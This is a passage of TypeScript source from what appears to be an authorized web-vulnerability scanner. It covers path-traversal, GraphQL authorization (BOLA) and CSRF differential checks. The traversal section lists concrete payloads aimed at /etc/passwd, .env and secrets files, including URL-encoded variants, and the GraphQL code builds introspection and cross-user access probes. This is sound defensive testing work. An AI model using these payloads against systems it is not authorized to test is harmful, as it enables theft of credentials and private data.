    summary: 'No command-execution nonce appeared in output across echo variants.',
    details: { results, baseStatus: base.status },
  }
}

/**
 * File-path traversal oracle. Unlike a pure normalization differential, this proves a jail escape by
 * reading a synthetic known file outside the served directory (classic passwd signature) or by
 * returning content that a nonexistent sibling traversal cannot produce. It never touches host files
 * unless the target itself does so; only response bytes are compared.
 */
async function diffFileTraversal(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const param = req.param
  if (!param) return { verdict: 'inconclusive', summary: 'A file/path parameter is required for the traversal oracle.', details: {} }
  const location: SurfaceParamLocation = req.paramLocation ?? 'query'
  const missing = `guardian-none-${randToken(8)}.txt`
  const controlValues = [`../${missing}`, `..%2f${missing}`, missing]
  const controls: Array<{ value: string; status: number; body: string }> = []
  for (const value of controlValues.slice(0, 2)) {
    const ex = await send(injectParam({ ...req, param }, value))
    if (ex) controls.push({ value, status: ex.status, body: ex.body.slice(0, 2000) })
  }
  const controlOk = controls.length > 0 && controls.every(c => c.status >= 400 || c.body.length === 0)
  const controlBodies = controls.map(c => c.body).join('\n')
  const passwdSignature = /^[A-Za-z0-9_.-]+:[^:\n]*:\d+:\d+:[^:\n]*:[^:\n]*:[^\n]*$/m
  // Generic read oracles: classic passwd, a synthetic app secret, and a well-known log file. The
  // `.log` variants keep a suffix check satisfied (`name.endsWith('.log')`) while still escaping.
  const candidates: Array<{ value: string; kind: 'passwd' | 'content' }> = [
    { value: '../../../../etc/passwd', kind: 'passwd' },
    { value: '../../../../../../etc/passwd', kind: 'passwd' },
    { value: '../../../../app/config/secrets.env', kind: 'content' },
    { value: '../../../../app/.env', kind: 'content' },
    { value: '../../../../var/log/system/audit.log', kind: 'content' },
    { value: '../../var/log/system/audit.log', kind: 'content' },
    { value: '../secret.txt', kind: 'content' },
    { value: '../private/secret.txt', kind: 'content' },
    { value: '../flag.txt', kind: 'content' },
    { value: '../.env', kind: 'content' },
    { value: '../config.json', kind: 'content' },
  ]
  const results: Array<Record<string, unknown>> = []
  // Filter evidence: when a valid in-jail name still resolves after a literal `../` prefix, the
  // handler strips traversal syntax before resolving. Only then is an encoded (double-decoded)
  // variant a legitimate bypass to test; sending it blindly flags hardened single-segment handlers.
  let filterStripsTraversal = false
  if (req.baselineValue) {
    const valid = await send(injectParam({ ...req, param }, req.baselineValue))
    const stripped = await send(injectParam({ ...req, param }, `../${req.baselineValue}`))
    filterStripsTraversal = Boolean(valid && stripped && valid.status >= 200 && valid.status < 300 &&
      stripped.status >= 200 && stripped.status < 300 && responseSimilarity(valid.body, stripped.body) >= 0.95)
  }
  if (filterStripsTraversal) {
    candidates.push(
      { value: '..%2f..%2f..%2f..%2fetc%2fpasswd', kind: 'passwd' },
      { value: '..%2fprivate%2fsecret.txt', kind: 'content' },
      { value: '..%2f..%2fsrv%2fprivate%2fsecret.txt', kind: 'content' },
    )
  }
  for (const cand of candidates) {
    const ex = await send(injectParam({ ...req, param }, cand.value))
    if (!ex) continue
    const ok = ex.status >= 200 && ex.status < 300 && ex.body.trim().length > 0
    const passwd = cand.kind === 'passwd' && passwdSignature.test(ex.body)
    // Content oracle: a non-empty 2xx body that the nonexistent-sibling traversal could not produce.
    const distinguishable = cand.kind === 'content' && ok && !controlBodies.includes(ex.body.slice(0, 200)) &&
      !ex.body.includes(missing) && !ex.body.includes(cand.value)
    results.push({ value: cand.value, kind: cand.kind, status: ex.status, bytes: ex.body.length, passwd, distinguishable })
    if (passwd || distinguishable) {
      const needle = passwd
        ? (ex.body.match(passwdSignature)?.[0] ?? '').slice(0, 40)
        : ex.body.trim().split('\n')[0]?.slice(0, 40) ?? ''
      anomalies.push({
        type: 'path_traversal_escape', param, location, payload: cand.value, oracle: passwd ? 'passwd_signature' : 'content_differential',
        contentNeedle: needle, controlBlocked: controlOk, status: ex.status,
        suggestedReplayKind: 'http_chain',
      })
      return {
        verdict: 'signal',
        summary: 'A relative-path payload read a file outside the served directory (jail-escape oracle).',
        details: { results, controls, suggestedReplayKind: 'http_chain' },
      }
    }
  }
  return {
    verdict: 'no_signal',
    summary: 'No out-of-jail file read was observed; traversal variants stayed inside the served root.',
    details: { results, controls },
  }
}

export interface GraphqlFieldArg {
  name: string
  typeName: string
  isNonNull: boolean
  isList: boolean
  rawType: string
}

export interface GraphqlFieldDef {
  name: string
  args: GraphqlFieldArg[]
  returnTypeName: string
  isList: boolean
}

export interface GraphqlParsedSchema {
  queryType: string
  mutationType: string | null
  types: Record<string, GraphqlFieldDef[]>
}

const GQL_BUILTIN_SCALARS = new Set(['ID', 'Int', 'Float', 'String', 'Boolean'])

function parseSdlTypeString(raw: string): { typeName: string; isNonNull: boolean; isList: boolean; rawType: string } {
  const clean = raw.trim()
  const isNonNull = clean.endsWith('!')
  const isList = clean.includes('[')
  const typeName = clean.replace(/[\[\]!\s]/g, '') || 'String'
  return { typeName, isNonNull, isList, rawType: clean }
}

/** Deterministic GraphQL SDL parser (no external parser dependency; safe against malformed input). */
export function parseGraphqlSdl(sdl: string): GraphqlParsedSchema {
  const types: Record<string, GraphqlFieldDef[]> = {}
  const stripped = sdl
    .replace(/#[^\r\n]*/g, ' ')
    .replace(/"""[\s\S]*?"""/g, ' ')
    .replace(/"(?:\\.|[^"\\])*"/g, ' ')

  const typeRe = /\btype\s+([A-Za-z_][A-Za-z0-9_]*)(?:\s+implements\s+[^{]+)?\s*\{([^}]*)\}/g
  for (const m of stripped.matchAll(typeRe)) {
    const typeName = m[1]
    const body = m[2]
    const fields: GraphqlFieldDef[] = []
    const fieldRe = /([A-Za-z_][A-Za-z0-9_]*)\s*(?:\(([^)]*)\))?\s*:\s*([\[\]!A-Za-z0-9_]+)/g
    for (const fm of body.matchAll(fieldRe)) {
      const fieldName = fm[1]
      const argsRaw = fm[2] ?? ''
      const retRaw = fm[3]
      const args: GraphqlFieldArg[] = []
      if (argsRaw.trim()) {
        for (const piece of argsRaw.split(',')) {
          const am = /([A-Za-z_][A-Za-z0-9_]*)\s*:\s*([\[\]!A-Za-z0-9_]+)/.exec(piece)
          if (!am) continue
          const parsedArgType = parseSdlTypeString(am[2])
          args.push({ name: am[1], ...parsedArgType })
        }
      }
      const parsedRet = parseSdlTypeString(retRaw)
      fields.push({ name: fieldName, args, returnTypeName: parsedRet.typeName, isList: parsedRet.isList })
    }
    if (fields.length > 0) types[typeName] = fields
  }

  return {
    queryType: types.Query ? 'Query' : (Object.keys(types).find(k => /query/i.test(k)) ?? 'Query'),
    mutationType: types.Mutation ? 'Mutation' : (Object.keys(types).find(k => /mutation/i.test(k)) ?? null),
    types,
  }
}

function unwrapIntrospectionType(t: unknown): { typeName: string; isNonNull: boolean; isList: boolean; rawType: string } {
  const rec = (t && typeof t === 'object' ? t : {}) as { kind?: string; name?: string | null; ofType?: unknown }
  if (rec.kind === 'NON_NULL' && rec.ofType) {
    const inner = unwrapIntrospectionType(rec.ofType)
    return { ...inner, isNonNull: true, rawType: `${inner.rawType}!` }
  }
  if (rec.kind === 'LIST' && rec.ofType) {
    const inner = unwrapIntrospectionType(rec.ofType)
    return { ...inner, isList: true, rawType: `[${inner.rawType}]` }
  }
  const name = typeof rec.name === 'string' && rec.name ? rec.name : 'String'
  return { typeName: name, isNonNull: false, isList: false, rawType: name }
}

export function parseGraphqlIntrospection(schemaObj: Record<string, unknown>): GraphqlParsedSchema {
  const queryType = ((schemaObj.queryType as { name?: string } | undefined)?.name) ?? 'Query'
  const mutationType = ((schemaObj.mutationType as { name?: string } | undefined)?.name) ?? null
  const types: Record<string, GraphqlFieldDef[]> = {}
  const rawTypes = Array.isArray(schemaObj.types) ? schemaObj.types : []
  for (const rt of rawTypes) {
    if (!rt || typeof rt !== 'object') continue
    const tr = rt as { name?: string; kind?: string; fields?: unknown[] }
    if (!tr.name || tr.name.startsWith('__') || !Array.isArray(tr.fields)) continue
    if (tr.kind && tr.kind !== 'OBJECT' && tr.kind !== 'INTERFACE') continue
    const fields: GraphqlFieldDef[] = []
    for (const rf of tr.fields) {
      if (!rf || typeof rf !== 'object') continue
      const fr = rf as { name?: string; args?: unknown[]; type?: unknown }
      if (!fr.name) continue
      const args: GraphqlFieldArg[] = []
      for (const ra of Array.isArray(fr.args) ? fr.args : []) {
        if (!ra || typeof ra !== 'object') continue
        const ar = ra as { name?: string; type?: unknown }
        if (!ar.name) continue
        args.push({ name: ar.name, ...unwrapIntrospectionType(ar.type) })
      }
      const ret = unwrapIntrospectionType(fr.type)
      fields.push({ name: fr.name, args, returnTypeName: ret.typeName, isList: ret.isList })
    }
    if (fields.length > 0) types[tr.name] = fields
  }
  return { queryType, mutationType, types }
}

function synthesizeGraphqlArgValue(arg: GraphqlFieldArg): unknown {
  let base: unknown
  switch (arg.typeName) {
    case 'ID': base = '1'; break
    case 'Int': base = 1; break
    case 'Float': base = 1.5; break
    case 'Boolean': base = true; break
    default: base = 'test'; break
  }
  return arg.isList ? [base] : base
}

function buildSelectionSet(
  schema: GraphqlParsedSchema,
  typeName: string,
  depth: number,
  maxDepth: number,
  visited: Set<string>,
): { selection: string; nestedPath: string[] } {
  if (GQL_BUILTIN_SCALARS.has(typeName) || depth > maxDepth) {
    return { selection: '', nestedPath: [] }
  }
  const fields = schema.types[typeName]
  if (!fields || fields.length === 0) return { selection: '', nestedPath: [] }
  const scalarFields = fields.filter(f => GQL_BUILTIN_SCALARS.has(f.returnTypeName) || !schema.types[f.returnTypeName]).slice(0, 4)
  const objectFields = fields.filter(f => !GQL_BUILTIN_SCALARS.has(f.returnTypeName) && Boolean(schema.types[f.returnTypeName]))
  const parts: string[] = scalarFields.map(f => f.name)
  const nestedPath: string[] = []
  if (depth < maxDepth) {
    for (const objField of objectFields.slice(0, 3)) {
      if (visited.has(objField.returnTypeName)) continue
      const nextVisited = new Set(visited)
      nextVisited.add(objField.returnTypeName)
      const sub = buildSelectionSet(schema, objField.returnTypeName, depth + 1, maxDepth, nextVisited)
      if (sub.selection) {
        parts.push(`${objField.name} ${sub.selection}`)
        nestedPath.push(objField.name, ...sub.nestedPath)
      }
    }
  }
  if (parts.length === 0) parts.push('__typename')
  return { selection: `{ ${parts.join(' ')} }`, nestedPath }
}

function buildGraphqlOperation(
  schema: GraphqlParsedSchema,
  opKind: 'query' | 'mutation',
  field: GraphqlFieldDef,
  maxDepth: number,
): { query: string; variables: Record<string, unknown>; nestedPath: string[] } {
  const variables: Record<string, unknown> = {}
  const varDecls: string[] = []
  const callArgs: string[] = []
  for (const arg of field.args) {
    const varName = arg.name.replace(/[^A-Za-z0-9_]/g, '') || 'arg'
    varDecls.push(`$${varName}: ${arg.rawType}`)
    callArgs.push(`${arg.name}: $${varName}`)
    variables[varName] = synthesizeGraphqlArgValue(arg)
  }
  const visited = new Set<string>([field.returnTypeName])
  const { selection, nestedPath } = buildSelectionSet(schema, field.returnTypeName, 1, maxDepth, visited)
  const opHeader = varDecls.length > 0 ? `${opKind}(${varDecls.join(', ')})` : opKind
  const callExpr = callArgs.length > 0 ? `${field.name}(${callArgs.join(', ')})` : field.name
  const query = `${opHeader} { ${callExpr}${selection ? ` ${selection}` : ''} }`
  return { query, variables, nestedPath }
}

/**
 * Resolve a GraphQL variable probe into a concrete operation: introspect the endpoint, find a root
 * field that accepts the parameter under test, and synthesize a typed query/mutation for it.
 * Only used when the caller did not supply an explicit `graphqlQuery`.
 */
async function resolveGraphqlArgQuery(
  req: ProbeDifferentialRequest,
  send: (r: InjectedRequest & { persona?: string }) => Promise<BrokerExchangeResult | null>,
): Promise<void> {
  if (!req.param) return
  const introQuery = '{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{kind name ofType{kind name}}}}}}}'
  const intro = await send({
    method: 'POST',
    pathAndQuery: req.pathAndQuery,
    body: JSON.stringify({ query: introQuery }),
    headers: { 'Content-Type': 'application/json', ...(req.headers ?? {}) },
    persona: req.persona,
  })
  if (!intro) return
  let schemaObj: Record<string, unknown> | undefined
  try {
    const parsed = JSON.parse(intro.body) as { data?: { __schema?: Record<string, unknown> } }
    schemaObj = parsed.data?.__schema
  } catch {
    return
  }
  if (!schemaObj || !Array.isArray((schemaObj as { types?: unknown[] }).types)) return
  const schema = parseGraphqlIntrospection(schemaObj)
  const roots: Array<{ kind: 'query' | 'mutation'; typeName: string | null }> = [
    { kind: 'query', typeName: schema.queryType },
    { kind: 'mutation', typeName: schema.mutationType },
  ]
  for (const root of roots) {
    if (!root.typeName) continue
    const field = (schema.types[root.typeName] ?? []).find(f => f.args.some(a => a.name === req.param))
    if (!field) continue
    const op = buildGraphqlOperation(schema, root.kind, field, 3)
    req.graphqlQuery = op.query
    req.jsonBody = { ...(req.jsonBody ?? {}), variables: op.variables }
    return
  }
}

async function diffGraphqlSurface(ctx: DiffContext, grant: Grant): Promise<DiffOutcome> {
  const { req, send, notes, anomalies } = ctx
  const localLab = Boolean(grant.allowLocalLab && process.env.GUARDIAN_ALLOW_LOCAL_LAB === '1')
  const tier = grant.tier ?? 1
  const useGet = req.method === 'GET'
  const gql = (
    query: string,
    variables?: Record<string, unknown>,
    persona: string | undefined = req.persona,
  ): InjectedRequest & { persona?: string } => {
    if (!useGet) {
      const payload: Record<string, unknown> = { query }
      if (variables && Object.keys(variables).length > 0) payload.variables = variables
      return {
        method: 'POST',
        pathAndQuery: req.pathAndQuery,
        body: JSON.stringify(payload),
        headers: { 'Content-Type': 'application/json', ...(req.headers ?? {}) },
        persona,
      }
    }
    let pq = setQueryParam(req.pathAndQuery, 'query', query)
    if (variables && Object.keys(variables).length > 0) {
      pq = setQueryParam(pq, 'variables', JSON.stringify(variables))
    }
    return { method: 'GET', pathAndQuery: pq, headers: req.headers, persona }
  }
  const parse = (body: string): { data?: Record<string, unknown>; errors?: Array<{ message?: string }> } | null => {
    try { return JSON.parse(body) as { data?: Record<string, unknown>; errors?: Array<{ message?: string }> } } catch { return null }
  }

  // Strictly bounded non-DoS limits (depth <= 6, aliases <= 8)
  const safeMaxDepth = Math.max(2, Math.min(req.maxDepth ?? 4, 6))
  const safeMaxAliases = Math.max(3, Math.min(req.maxAliases ?? 3, 8))

  const typename = await send(gql('{__typename}'))
  const fullIntroQuery = '{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{kind name ofType{kind name}}} type{kind name ofType{kind name ofType{kind name}}}}}}}'
  const introspection = await send(gql(fullIntroQuery))
  const introParsed = introspection ? parse(introspection.body) : null
  const introSchemaObj = introParsed?.data?.__schema as Record<string, unknown> | undefined
  const introspectionEnabled = Boolean(introSchemaObj && Array.isArray((introSchemaObj as { types?: unknown[] }).types))

  // Resolve schema: prefer live introspection, fall back to provided SDL (or merge SDL when introspection lacks nested types)
  let schema: GraphqlParsedSchema | null = null
  if (introspectionEnabled && introSchemaObj) {
    schema = parseGraphqlIntrospection(introSchemaObj)
  }
  if (req.sdl) {
    const sdlSchema = parseGraphqlSdl(req.sdl)
    if (!schema || Object.keys(schema.types).length <= 1) {
      schema = sdlSchema
    } else {
      schema = {
        queryType: schema.queryType || sdlSchema.queryType,
        mutationType: schema.mutationType ?? sdlSchema.mutationType,
        types: { ...sdlSchema.types, ...schema.types },
      }
    }
  }

  if (!typename && !schema) {
    return { verdict: 'inconclusive', summary: 'Endpoint did not return GraphQL JSON.', details: { status: null } }
  }

  const suggestion = await send(gql('{__typenam}'))
  const aliasBody = Array.from({ length: safeMaxAliases }, (_, i) => `a${i}:__typename`).join(' ')
  const alias = await send(gql(`{${aliasBody}}`))
  const suggestionLeak = Boolean(suggestion && /did you mean/i.test(suggestion.body))
  const aliasKeys = alias ? Object.keys((parse(alias.body)?.data ?? {})).length : 0

  const fuzzedQueries: Array<Record<string, unknown>> = []
  const fuzzedMutations: Array<Record<string, unknown>> = []

  if (schema) {
    const rootQueryFields = (schema.types[schema.queryType] ?? []).slice(0, 6)
    const idCandidates = [...new Set((req.resourceIds ?? []).filter(i => /^[A-Za-z0-9_.:-]{1,128}$/.test(i)))].slice(0, 2)
    const walkNested = (node: unknown, path: string[]): unknown => {
      let cur = node
      for (const key of path) {
        if (!cur || typeof cur !== 'object') return undefined
        cur = (cur as Record<string, unknown>)[key]
      }
      return cur
    }
    const nonEmpty = (v: unknown): boolean => (Array.isArray(v) ? v.length > 0 : Boolean(v && typeof v === 'object' && Object.keys(v as object).length > 0))
    for (const field of rootQueryFields) {
      const op = buildGraphqlOperation(schema, 'query', field, safeMaxDepth)
      if (req.ownerPersona && req.otherPersona) {
        const idArg = field.args.find(a => /^(?:ID|String)$/.test(a.typeName))
        const triedIds = idArg ? (idCandidates.length > 0 ? idCandidates : ['1']) : [undefined]
        for (const idValue of triedIds) {
          const variables = { ...op.variables }
          if (idArg && idValue !== undefined) variables[idArg.name] = idValue
          const ownerEx = await send(gql(op.query, variables, req.ownerPersona))
          const otherEx = await send(gql(op.query, variables, req.otherPersona))
          const ownerParsed = ownerEx ? parse(ownerEx.body) : null
          const otherParsed = otherEx ? parse(otherEx.body) : null
          const otherData = otherParsed?.data?.[field.name]
          const ownerData = ownerParsed?.data?.[field.name]
          const otherHasData = Boolean(
            otherEx && otherEx.status >= 200 && otherEx.status < 300 && otherData !== null && otherData !== undefined,
          )
          fuzzedQueries.push({
            field: field.name,
            resourceId: idValue ?? null,
            nestedPath: op.nestedPath,
            ownerStatus: ownerEx?.status ?? null,
            otherStatus: otherEx?.status ?? null,
            otherHasData,
          })
          if (!otherHasData || ownerData === null || ownerData === undefined) continue
          // Both actors must be reading the *same* root object. `me`-style resolvers return a
          // different node per caller, so identical nested shapes there are not object-level BOLA.
          if (ownerData && otherData && typeof ownerData === 'object' && typeof otherData === 'object') {
            const ownerRootId = (ownerData as Record<string, unknown>).id
            const otherRootId = (otherData as Record<string, unknown>).id
            if (ownerRootId !== undefined && otherRootId !== undefined && String(ownerRootId) !== String(otherRootId)) continue
          }
          // Nested-resource BOLA: both actors receive the same owned sub-collection/data.
          if (op.nestedPath.length > 0) {
            const ownerNested = walkNested(ownerData, op.nestedPath)
            const otherNested = walkNested(otherData, op.nestedPath)
            if (nonEmpty(ownerNested) && nonEmpty(otherNested) && JSON.stringify(ownerNested) === JSON.stringify(otherNested)) {
              anomalies.push({
                type: 'graphql_nested_bola', field: field.name, nestedPath: op.nestedPath,
                resourceId: idValue ?? null, otherPersona: req.otherPersona, status: otherEx!.status,
                query: op.query, variables,
              })
              break
            }
          }
          // Single-object BOLA: the other actor receives an object that names a different owner.
          if (idArg && otherData && typeof otherData === 'object') {
            const ownerRef = (otherData as Record<string, unknown>).owner ?? (otherData as Record<string, unknown>).ownerId
            const ownerId = ownerRef && typeof ownerRef === 'object' ? (ownerRef as Record<string, unknown>).id : ownerRef
            if (typeof ownerId === 'string' && req.otherUserId && ownerId !== req.otherUserId) {
              anomalies.push({
                type: 'graphql_cross_persona_access', field: field.name, resourceId: idValue ?? null,
                ownerField: ownerId, otherPersona: req.otherPersona, status: otherEx!.status,
                query: op.query, variables,
              })
              break
            }
          }
          if (!idArg || !idValue) break
        }
      } else {
        const ex = await send(gql(op.query, op.variables, req.persona))
        fuzzedQueries.push({
          field: field.name,
          nestedPath: op.nestedPath,
          status: ex?.status ?? null,
        })
      }
    }

    // Mutation fuzzing gate: strictly blocked on public Tier 2 without matching sandboxWriteAllowlist
    if (req.testMutations) {
      const hasSandboxAllowlist = Boolean(
        grant.sandboxWriteAllowlist?.length &&
        matchesApprovedEndpointPattern({ origin: ctx.origin, method: 'POST', pathAndQuery: req.pathAndQuery }, grant.sandboxWriteAllowlist),
      )
      const mutationsAllowed = localLab || tier >= 3 || hasSandboxAllowlist
      if (!mutationsAllowed) {
        notes.push('GraphQL mutation fuzzing skipped: requires Tier 3, local-lab, or matching sandboxWriteAllowlist.')
      } else if (schema.mutationType && schema.types[schema.mutationType]) {
        const mutFields = schema.types[schema.mutationType].slice(0, 4)
        for (const mf of mutFields) {
          const op = buildGraphqlOperation(schema, 'mutation', mf, Math.min(3, safeMaxDepth))
          const ex = await send(gql(op.query, op.variables, req.otherPersona ?? req.persona))
          const parsedMut = ex ? parse(ex.body) : null
          const succeeded = Boolean(ex && ex.status >= 200 && ex.status < 300 && parsedMut?.data && !parsedMut.errors?.length)
          fuzzedMutations.push({ field: mf.name, status: ex?.status ?? null, succeeded })
          if (succeeded) {
            anomalies.push({ type: 'graphql_mutation_accessible', field: mf.name, status: ex!.status })
          }
        }
      }
    }
  }

  // No SDL / introspection disabled: derive a nested object-level hypothesis from the target's own
  // field vocabulary. Root names come from discovered collection nouns; ids are other-actor objects.
  // A root that resolves for both actors with identical nested owned data is a resolver BOLA.
  if (!schema && req.ownerPersona && req.otherPersona) {
    const allRoots = [...new Set((req.graphqlRoots ?? []).filter(r => /^[A-Za-z_][A-Za-z0-9_]*$/.test(r)))]
    const rootPriority = ['account', 'user', 'organization', 'org', 'team', 'workspace', 'project', 'invoice', 'order', 'customer', 'member', 'ticket', 'issue', 'document', 'file', 'report', 'product']
    const rank = (name: string): number => {
      const idx = rootPriority.findIndex(p => name.toLowerCase() === p || name.toLowerCase().replace(/s$/, '') === p)
      return idx === -1 ? rootPriority.length : idx
    }
    const roots = allRoots
      .filter(r => (req.graphqlSeedsByRoot?.[r]?.length ?? 0) > 0)
      .sort((a, b) => rank(a) - rank(b) || a.length - b.length)
      .slice(0, 3)
    const fallbackIds = [...new Set((req.resourceIds ?? []).filter(id => /^[A-Za-z0-9_.:-]{1,128}$/.test(id)))].slice(0, 1)
    const nestedFields = ['tickets', 'invoices', 'orders', 'members', 'projects', 'accounts', 'files', 'documents', 'notes', 'comments', 'items', 'reports']
    for (const root of roots) {
      const rootIds = (req.graphqlSeedsByRoot?.[root]?.length ? req.graphqlSeedsByRoot[root]! : fallbackIds).slice(0, 1)
      const argNames = ['id', `${root.replace(/s$/i, '')}Id`, `${root}Id`].filter((v, i, a) => a.indexOf(v) === i)
      let rootFound = false
      for (const id of rootIds) {
        for (const argName of argNames) {
          const probe = `{ ${root}(${argName}: ${JSON.stringify(id)}) { id name } }`
          const ownerRoot = parse((await send(gql(probe, undefined, req.ownerPersona)))?.body ?? '')
          const otherRoot = parse((await send(gql(probe, undefined, req.otherPersona)))?.body ?? '')
          const ownerObj = ownerRoot?.data?.[root]
          const otherObj = otherRoot?.data?.[root]
          if (!ownerObj || !otherObj || typeof ownerObj !== 'object' || typeof otherObj !== 'object' || Array.isArray(ownerObj) || Array.isArray(otherObj)) continue
          rootFound = true
          fuzzedQueries.push({ field: root, argName, resourceId: id, discovery: 'no_sdl', status: otherRoot ? 200 : null })
          for (const nested of nestedFields.slice(0, 3)) {
            const q = `{ ${root}(${argName}: ${JSON.stringify(id)}) { id ${nested} { id name subject body title status } } }`
            const ownerEx = await send(gql(q, undefined, req.ownerPersona))
            const otherEx = await send(gql(q, undefined, req.otherPersona))
            const ownerData = parse(ownerEx?.body ?? '')?.data?.[root]
            const otherData = parse(otherEx?.body ?? '')?.data?.[root]
            const ownerNested = ownerData && typeof ownerData === 'object' ? (ownerData as Record<string, unknown>)[nested] : undefined
            const otherNested = otherData && typeof otherData === 'object' ? (otherData as Record<string, unknown>)[nested] : undefined
            const nonEmpty = (v: unknown): boolean => (Array.isArray(v) ? v.length > 0 : Boolean(v && typeof v === 'object' && Object.keys(v as object).length > 0))
            if (nonEmpty(ownerNested) && nonEmpty(otherNested) && JSON.stringify(ownerNested) === JSON.stringify(otherNested)) {
              anomalies.push({
                type: 'graphql_nested_bola', field: root, nestedPath: [nested], resourceId: id,
                otherPersona: req.otherPersona, status: otherEx?.status ?? null,
                query: q, variables: {}, discovery: 'no_sdl',
              })
              break
            }
          }
          break
        }
        if (anomalies.some(a => a.type === 'graphql_nested_bola')) break
        if (rootFound) break
      }
      if (anomalies.some(a => a.type === 'graphql_nested_bola')) break
    }
  }

  const details: Record<string, unknown> = {
    introspectionEnabled,
    typeCount: schema ? Object.keys(schema.types).length : null,
    fieldSuggestionLeak: suggestionLeak,
    aliasBatchingAllowed: aliasKeys >= 3,
    fuzzedQueries,
    fuzzedMutations,
  }
  if (req.persona) {
    const anon = await send(gql('{__schema{queryType{name}}}'))
    const authed = await send(gql('{__schema{queryType{name}}}', undefined, req.persona))
    if (anon && authed) {
      details.authDiff = {
        anonymousStatus: anon.status, personaStatus: authed.status,
        similarity: responseSimilarity(anon.body, authed.body),
        anonymousIntrospection: Boolean(parse(anon.body)?.data),
        personaIntrospection: Boolean(parse(authed.body)?.data),
      }
    }
  }
  if (introspectionEnabled) anomalies.push({ type: 'introspection_enabled' })
  if (suggestionLeak && !req.persona) anomalies.push({ type: 'field_suggestion_leak' })
  // Alias batching on an authenticated business API is expected GraphQL behaviour; only report it as
  // an unauthenticated schema-exposure signal.
  if (aliasKeys >= 3 && !req.persona) anomalies.push({ type: 'alias_batching_allowed', aliases: aliasKeys })
  return {
    verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
    summary: anomalies.length > 0 ? 'GraphQL surface exposure or resolver authz indicators observed.' : 'No GraphQL exposure indicators observed.',
    details,
  }
}

function extractCreatedIdFromJson(body: string): string | null {
  try {
    const parsed = JSON.parse(body) as unknown
    const scan = (node: unknown, depth: number): string | null => {
      if (depth > 4 || !node || typeof node !== 'object') return null
      if (Array.isArray(node)) {
        for (const item of node.slice(0, 3)) {
          const hit = scan(item, depth + 1)
          if (hit) return hit
        }
        return null
      }
      for (const [k, v] of Object.entries(node as Record<string, unknown>)) {
        if (/^(?:id|uuid|[a-z0-9_]*_?id)$/i.test(k) && (typeof v === 'string' || typeof v === 'number')) {
          const s = String(v).trim()
          if (s.length >= 1 && s.length <= 128) return s
        }
      }
      for (const v of Object.values(node as Record<string, unknown>)) {
        if (v && typeof v === 'object') {
          const hit = scan(v, depth + 1)
          if (hit) return hit
        }
      }
      return null
    }
    return scan(parsed, 0)
  } catch {
    return null
  }
}

function jsonRecord(body: string): Record<string, unknown> | null {
  try {
    const parsed = JSON.parse(body) as unknown
    return parsed && typeof parsed === 'object' && !Array.isArray(parsed) ? parsed as Record<string, unknown> : null
  } catch { return null }
}

function scalarMatches(actual: unknown, expected: unknown): boolean {
  if (actual === undefined || actual === null) return false
  if (typeof actual === 'object') return false
  return String(actual) === String(expected)
}

const csrfStateFields = [
  'name', 'status', 'state', 'title', 'label', 'displayName', 'display_name', 'description',
  'note', 'notes', 'tier', 'plan', 'enabled', 'active', 'value',
]
/** Fields safe to mutate for a write-path authorization proof (lifecycle state is excluded). */
const bolaWriteFields = [
  'name', 'title', 'label', 'note', 'notes', 'description', 'return_url', 'returnUrl', 'returnTo',
  'amount', 'amountCents', 'amount_cents', 'total', 'tier', 'plan', 'enabled', 'active', 'value',
  'status', 'state',
]

function firstStateField(record: Record<string, unknown> | null, preferred?: string): string | null {
  if (!record) return null
  if (preferred && preferred in record && typeof record[preferred] !== 'object') return preferred
  return csrfStateFields.find(f => f in record && typeof record[f] !== 'object') ?? null
}

/**
 * Locate the mutated scalar on a read response: a top-level field, or the matching record inside a
 * collection (`items`, `jobs`, …) when only list routes are exposed.
 */
function stateViewOf(
  record: Record<string, unknown> | null,
  preferred?: string,
  recordId?: string,
): { field: string; value: unknown } | null {
  if (!record) return null
  const direct = firstStateField(record, preferred)
  if (direct) return { field: direct, value: record[direct] }
  for (const value of Object.values(record)) {
    if (!Array.isArray(value)) continue
    const rows = value.filter((r): r is Record<string, unknown> => Boolean(r) && typeof r === 'object' && !Array.isArray(r))
    const match = recordId
      ? rows.find(r => Object.values(r).some(v => (typeof v === 'string' || typeof v === 'number') && String(v) === recordId))
      : rows[0]
    if (!match) continue
    const field = preferred && preferred in match && typeof match[preferred] !== 'object'
      ? preferred
      : csrfStateFields.find(f => f in match && typeof match[f] !== 'object')
    if (field) return { field, value: match[field] }
  }
  return null
}

function stateValueCandidate(current: unknown, field: string): string | number | boolean {
  if (typeof current === 'number' && Number.isFinite(current)) return Math.round(current) + 73_337
  if (typeof current === 'boolean') return !current
  if (/url|uri|link|callback|redirect|return/i.test(field)) return `https://guardian-state-${randToken(8)}.invalid/cb`
  if (/status|state/i.test(field)) return `guardian_state_${randToken(6)}`
  return `guardian_state_${randToken(10)}`
}

/**
 * CSRF state-change differential (CWE-352).
 *
 * A cookie-authenticated mutation is replayed with only the victim session (no anti-CSRF token and
 * a foreign Origin), then the documented read route must show the new value. A same-origin control
 * write with the session's token restores the baseline (and proves the endpoint is functional), so a
 * 200 that never mutates or a token-enforcing endpoint both stay silent.
 */
async function diffCsrfStateChange(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const method: 'POST' | 'PUT' | 'PATCH' =
    req.method === 'PUT' || req.method === 'PATCH' ? req.method : 'POST'
  const readPath = req.readPath
  if (!readPath && !req.createReadTemplate) return { verdict: 'inconclusive', summary: 'csrf_state_change needs a read path.', details: {} }
  if (!req.session) return { verdict: 'inconclusive', summary: 'csrf_state_change needs a bound session.', details: {} }

  // Visit token-issuing routes first so the broker jar can bind the session's anti-CSRF token.
  const readCandidates = [...new Set([...(readPath ? [readPath] : []), ...(req.readPathCandidates ?? [])])].slice(0, 4)
  const primes = [...new Set([...(req.csrfPrimePaths ?? []), ...readCandidates, '/'])].slice(0, 5)
  for (const path of primes) {
    if (ctx.runner.stopReason) break
    await send({ method: 'GET', pathAndQuery: path })
  }

  let effectiveReadPath = readPath
  let baseline: BrokerExchangeResult | null = null
  let baselineView: { field: string; value: unknown } | null = null
  for (const path of readCandidates) {
    const ex = await send({ method: 'GET', pathAndQuery: path })
    if (!ex || ex.status < 200 || ex.status >= 300) continue
    const view = stateViewOf(jsonRecord(ex.body), req.stateField, req.stateRecordId)
    if (!view) continue
    effectiveReadPath = path
    baseline = ex
    baselineView = view
    break
  }
  if (!baseline || !baselineView) {
    return await diffCsrfCreate(ctx, readCandidates, req, method)
  }
